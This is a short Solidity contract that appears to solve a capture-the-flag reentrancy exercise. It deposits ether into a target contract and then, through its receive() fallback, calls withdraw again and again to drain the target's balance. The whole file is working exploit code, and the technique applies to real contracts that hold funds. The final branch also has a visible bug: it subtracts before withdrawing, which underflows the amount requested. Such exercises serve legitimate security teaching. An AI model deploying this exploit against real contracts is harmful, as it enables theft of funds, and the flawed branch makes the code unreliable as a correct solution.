// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./10Reentrancy.sol";

contract ReentranceSolution {
    Reentrance public reentrance;
    uint256 public valueToDonate;
    uint256 public totalValue;

    constructor(address reentranceAddress) public {
        reentrance = Reentrance(payable(reentranceAddress));
    }

    function solveChallenge() public payable {
        valueToDonate = msg.value;
        totalValue = address(reentrance).balance;
        reentrance.donate{value: valueToDonate}(address(this));
        reentrance.withdraw(valueToDonate);
    }

    receive() external payable {
        if (totalValue == 0) {
            return;
        } else if (valueToDonate <= totalValue) {
            totalValue -= valueToDonate;
            reentrance.withdraw(valueToDonate);
        } else if (valueToDonate > totalValue) {
            totalValue -= valueToDonate;
            reentrance.withdraw(totalValue);
        }
    }
}
